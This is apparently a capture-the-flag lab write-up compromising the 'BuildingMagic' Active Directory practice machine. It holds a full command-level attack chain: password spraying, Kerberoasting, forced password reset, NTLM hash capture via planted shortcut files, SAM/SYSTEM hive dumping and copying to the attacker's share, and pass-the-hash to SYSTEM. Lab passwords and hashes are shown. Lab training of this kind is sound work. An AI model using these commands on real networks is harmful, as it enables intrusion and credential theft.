# [HackSmarter.org - BuildingMagic](https://www.hacksmarter.org/courses/8c4fe505-a724-407f-a425-8e17503d4380/take)

![9abdc0aceae7863136fe8c8a9a1e3a84.png](/resources/9abdc0aceae7863136fe8c8a9a1e3a84.png)

## Table of Contents

- [Abstract](#abstract)
- [Scope and Objective](#scope-and-objective)
- [Enumeration](#enumeration)
- [Kerberoasting to obtain r.haggard](#kerberoasting-to-obtain-rhaggard)
- [ForceChangePassword to h.potch](#forcechangepassword-to-hpotch)
- [NTLM Theft to Initial Access as h.grangon](#ntlm-theft-to-initial-access-as-hgrangon)
- [Privilege Escalation to a.flatch with SeBackupPrivilege](#privilege-escalation-to-aflatch-with-sebackupprivilege)

***
## Abstract 
BuildingMagic is an Easy Windows Active Directory machine where we are provided with leaked database file which have MD5 password hashes of 10 different users and by using rainbow table, we can retrieve 2 plaintext passwords to further enumerate the domain.

By conducting password spraying attack, We discovered that one of the password could be used to authenticate to the domain as "r.widdleton" user, with valid domain credential, Kerberoasting attack can be conducted and bruteforce the password of "r.haggard"

The kerberoasted user has "ForceChangePassword" right over "h.potch" user and by chaing the password of this user, we can upload payload generate by [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) to "File-Share" share where "h.grangon" regularly review it and successfully crack password of this user.

"h.grangon" is a member of "Remote Management Users" where we could gain a foothold using Windows Remote Management protocol (WinRM) which we can loot user flag and discover SeBackupPrivilege privilege.

With this privilege, we can backup SYSTEM and SAM registry hive and extract NTLM hash of "Administrator" user, although using pass-the-hash attack, we can not gain access to the domain controller probably due to later changed of the password after promoted as the domain controller 

But as "a.flatch" shares the same password which is also a local administrators member, we can ultimately "pass-the-hash" and finally root the machine.

## Scope and Objective
**Objective**: As a penetration tester on the Hack Smarter Red Team, your objective is to achieve a full compromise of the Active Directory environment.

**Initial Access**: A prior enumeration phase has yielded a leaked database containing user credentials (usernames and hashed passwords). This information will serve as your starting point for gaining initial access to the network.

**Execution**: Your task is to leverage the compromised credentials to escalate privileges, move laterally through the Active Directory, and ultimately achieve a complete compromise of the domain.

**Note to user:* *To access the target machine, you must add the following entries to your `/etc/hosts` file:
- buildingmagic.local
- dc01.buildingmagic.local

**Leaked Database File**:
```
id	username	full_name	role		password
1	r.widdleton	Ron Widdleton	Intern Builder	c4a21c4d438819d73d24851e7966229c
2	n.bottomsworth	Neville Bottomsworth Plannner	61ee643c5043eadbcdc6c9d1e3ebd298
3	l.layman	Luna Layman	Planner		8960516f904051176cc5ef67869de88f
4	c.smith		Chen Smith	Builder		bbd151e24516a48790b2cd5845e7f148
5	d.thomas	Dean Thomas	Builder		4d14ff3e264f6a9891aa6cea1cfa17cb
6	s.winnigan	Samuel Winnigan	HR Manager	078576a0569f4e0b758aedf650cb6d9a
7	p.jackson	Parvati Jackson	Shift Lead	eada74b2fa7f5e142ac412d767831b54
8	b.builder	Bob Builder	Electrician	dd4137bab3b52b55f99f18b7cd595448
9	t.ren		Theodore Ren	Safety Officer	bfaf794a81438488e57ee3954c27cd75
10	e.macmillan	Ernest Macmillan Surveyor	47d23284395f618bea1959e710bc68ef
```

First thing I will do after obtaining this info is to create a user list where I use `awk` with `NR>1` to ignore first line and focus on the username part of this info.
```
awk 'NR>1 {print $2}' info.txt > user.txt
```
![d3da2a761deaefd8933781bc0beec529.png](/resources/d3da2a761deaefd8933781bc0beec529.png)

Now I will also use `awk` to create password hash list so we can copy them to known rainbow table or bruteforce them ourselves.
```
awk 'NR>1 {print $NF}' info.txt > hashes.txt
```
![2be12e798b5c0918d8eb614d9aefdc8a.png](/resources/2be12e798b5c0918d8eb614d9aefdc8a.png)



By using [CrackStation](https://crackstation.net/), I recovered 2 passwords and discovered that this leaked database hash password with MD5 hash before storing them.

- c4a21c4d438819d73d24851e7966229c -> lilronron
- bfaf794a81438488e57ee3954c27cd75 -> shadowhex7

![2b7f76d63a18093429582c46bd5d2161.png](/resources/2b7f76d63a18093429582c46bd5d2161.png)

## Enumeration

I will start with rustscan since it is faster than nmap and VPN connection can tolerate this much of traffic unlike HTB. (I could not use rustscan could not be used on HTB) and we can see a lot of port opening on this machine as expected since this is the domain controller

Although we discovered website on port 80 and port 8080 (indicates login portal), we gonna skip them for now unless we need to, since we have 2 plaintexts password and potential 10 usernames so we could use them to enumerate domain controller first.
```
rustscan -a $IP -- -A
```
![a5ff5907cd7984ca603f363ac5861269.png](/resources/a5ff5907cd7984ca603f363ac5861269.png)
![37a90ed8597ebd42c98cb57cdd17c059.png](/resources/37a90ed8597ebd42c98cb57cdd17c059.png)
![ef6d47197dfe243f8647ccf5692c64f4.png](/resources/ef6d47197dfe243f8647ccf5692c64f4.png)

I practiced a good AD pentest methodology, I use NetExec to check for Anonymous authentication and guest account if it could be used and in this case, Anonymous authentication is not allowed and guest account is disabled.

![c161eb26538e47c5cc06a28be7fc8340.png](/resources/c161eb26538e47c5cc06a28be7fc8340.png)

Using the user list and 2 plaintext passwords, I spray them via SMB authentication which reveals that "lilronron" is a valid password for "r.widdleton" user.
```
uv run nxc smb buildingmagic.local -u user.txt -p pass.txt --continue-on-success
```
![272804ba4860d85ee7fb7d21b4f1ee9b.png](/resources/272804ba4860d85ee7fb7d21b4f1ee9b.png)

After obtaining valid domain user credential, I check file share for the low-hanging fruit first and this user could not have any special permission on any share but we can still see "File-Share" which is a non-standard share which we can go back to it later after obtaining other user's credential.
```
uv run nxc smb buildingmagic.local -u 'r.widdleton' -p 'lilronron' --shares
```
![5d9699dba81e1aefd82e7057d0174466.png](/resources/5d9699dba81e1aefd82e7057d0174466.png)

Before enumerate further, I pull a valid domain user list to a new text file first so if I obtained a new hash or a password then I can only spray on the valid domain user.
```
uv run nxc ldap buildingmagic.local -u 'r.widdleton' -p 'lilronron' --users-export ad-user.txt
```
![4ceb329e8dea1d6d8504315ad3d55346.png](/resources/4ceb329e8dea1d6d8504315ad3d55346.png)

## Kerberoasting to obtain r.haggard

The second low-hanging fruit we could try to take is to Kerberoasting attack so after conducting this attack, we can retrieve the encrypted ticket for the "r.haggard" user to crack.
```
uv run nxc ldap buildingmagic.local -u 'r.widdleton' -p 'lilronron' --kerberoast krbroast.txt
```
![35e9518ae2625795661bc27143fc8404.png](/resources/35e9518ae2625795661bc27143fc8404.png)

By using `rockyou.txt` wordlist, we can obtain "r.haggard"'s password which is "rubeushagrid".
```
john --wordlist=/usr/share/wordlists/rockyou.txt krbroast.txt
```
![5d41372df5552dba3634cd16704417d0.png](/resources/5d41372df5552dba3634cd16704417d0.png)

Still, this user can not access the non-standard file share.

![361e2481b2e91a10cc7936fd178585ac.png](/resources/361e2481b2e91a10cc7936fd178585ac.png)

## ForceChangePassword to h.potch

Next, I use rusthound to retrieve domain information and that can be used to visualize the dangerous relationship between each domain object on the bloodhound.

```
rusthound-ce -d buildingmagic.local -u r.haggard -p rubeushagrid -z
```
![4f34682425bb57760486d4cb21f36a3e.png](/resources/4f34682425bb57760486d4cb21f36a3e.png)

The bloodhound result shows that "r.haggard" has "ForceChangePassword" right on the "h.potch" so we can use tool like bloodyAD to change password of this user.

![63b5c5b8cc0aea27f3d1e9a769c99bde.png](/resources/63b5c5b8cc0aea27f3d1e9a769c99bde.png)

```
bloodyAD --host $IP -d "buildingmagic.local" -u "r.haggard" -p "rubeushagrid" set password "h.potch" "Password123"
```
![90efcbdbda5898743a09e599588f7b9d.png](/resources/90efcbdbda5898743a09e599588f7b9d.png)

After changing password of "h.potch", We can see that this user have READ and WRITE permission over "File-Share"

```
uv run nxc smb buildingmagic.local -u 'h.potch' -p 'Password123' --shares
```
![178542335c22e507827b354f7cf4daf6.png](/resources/178542335c22e507827b354f7cf4daf6.png)

But there is nothing on this share.

```
smbclient \\\\buildingmagic.local\\File-Share -U 'h.potch'%'Password123'
```
![b404e68e107272279580d27855f501b0.png](/resources/b404e68e107272279580d27855f501b0.png)

## NTLM Theft to Initial Access as h.grangon

I will generate special payload that will callback to my machine via [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) and upload to this special share to see if there is any user that interacting with file inside the share.

```
python ntlm_theft.py -g all -s $YOUR_IP -f important
```
![4c6ead2b9ed49d2d62bd780c14c690e9.png](/resources/4c6ead2b9ed49d2d62bd780c14c690e9.png)

Now I will start up my responder to wait for authentication over SMB which if any user interact with the file I will upload then we can retrieve NTLMv2 hash of that user from this tool
```
sudo responder -I tun0
```

And after I uploaded a shortcut file, I was able to retrieve the NTLMv2 hash of "h.grangon" right away.
```
put important.lnk
```
![6b343129f5e104f124022a19b31cb32c.png](/resources/6b343129f5e104f124022a19b31cb32c.png)

Using `rockyou.txt` wordlist, we can recover password of this user which is "magic4ever"

![fff6fada0e72bbfacc686fd534a331d9.png](/resources/fff6fada0e72bbfacc686fd534a331d9.png)

According to bloodhound, this user is a member of "Remote Management Users" which mean we can use Windows Remote Management protocol (WinRM) to authenticate and gain foothold on the domain controller.

![f8aecb4b944e601482744ce4c02427a3.png](/resources/f8aecb4b944e601482744ce4c02427a3.png)

Confirming with NetExec, we can see that this user can execute commands on this domain controller indicates by "Pwn3d!" sign.

```
uv run nxc winrm buildingmagic.local -u 'h.grangon' -p 'magic4ever'
```
![fe7187a7105842fe2c9c31e2c66ce32e.png](/resources/fe7187a7105842fe2c9c31e2c66ce32e.png)

Now we can use evil-winrm or evil-winrm.py to gain foothold and obtain user flag.

```
evil-winrm -i buildingmagic.local -u 'h.grangon' -p 'magic4ever'
```
![16d18e78decf6aaf61cad9be482b0df7.png](/resources/16d18e78decf6aaf61cad9be482b0df7.png)

## Privilege Escalation to a.flatch with SeBackupPrivilege

I check the current privilege I have on this user which reveals that I have SeBackupPrivilege but along with SeRestorePrivilege which mean this user is not in "Backup Operators" group (as seen in bloodhound) 

![0e791521507e228502e494945d94a386.png](/resources/0e791521507e228502e494945d94a386.png)

and thats also mean that normal privilege esclation technique using shadow copy to dump ntds.dit is not a valid choice here.

![efd8ee1df8aca9b6fbfe20fff9114b1e.png](/resources/efd8ee1df8aca9b6fbfe20fff9114b1e.png)

But I can still create a backup of critical registry hive such as SYSTEM and SAM hive to extract NTLM hash of local administrator user of this domain. if we are lucky then we should be able to gain access as administrator user unless the password of this user was changed after promoting to the domain controller.

Since SYSTEM hive is quite large so, I opened my netshare share and copy both files to my Kali Linux. This way is much faster than download function in evil-winrm. first I created a backup of both SYSTEM and SAM hives with reg save command.
```
reg save hklm\system system.hive
reg save hklm\sam sam.hive
cp system.hive \\$YOUR_IP\debug\
cp sam.hive \\$YOUR_IP\debug\
```
![87ff0949692c30d964b1de3b2dc1fbde.png](/resources/87ff0949692c30d964b1de3b2dc1fbde.png)

The tool that can be used to dump hashes is secretsdump from impacket and now we can get NTLM hash of Administrator account and try to verify its validity via pass-the-hash technique.
```
impacket-secretsdump -sam sam.hive -system system.hive local
```
![d8641b6f25891c6278f5a7f6f762b6d4.png](/resources/d8641b6f25891c6278f5a7f6f762b6d4.png)

Sadly, the hash could not be used on Administrator account which mean the password of this user might change after promoting to domain controller.

![be7ffa7ecce7084259908d72dd51ee97.png](/resources/be7ffa7ecce7084259908d72dd51ee97.png)

But there is a chance that other user (probably another admin user) could still use this password so I spray this hash with valid domain user list and discover that "a.flatch" user is still using the old password of "Administrator" and by looking at the "Pwn3d!" sign, this mean this user have administrative level access to write to `ADMIN$` share

```
uv run nxc smb buildingmagic.local -u ad-user.txt -H 520126a03f5d5a8d836f1c4f34ede7ce
```
![2f696094b4ce2cba56e9105082a49e28.png](/resources/2f696094b4ce2cba56e9105082a49e28.png)

And sure enough, this user is also a member of "Administrators" group.

![7a89cc9d00af590b5a660d9e1326ae59.png](/resources/7a89cc9d00af590b5a660d9e1326ae59.png)

Now we can either use WinRM or other impacket tool to gain access to the domain controller, since Windows Defender is not enabled then I will use psexec to become SYSTEM and obtain a root flag.

```
impacket-psexec a.flatch@buildingmagic.local -hashes :520126a03f5d5a8d836f1c4f34ede7ce
```
![dd57f106c36e29869a6c579686b5a876.png](/resources/dd57f106c36e29869a6c579686b5a876.png)

We are done :D
***
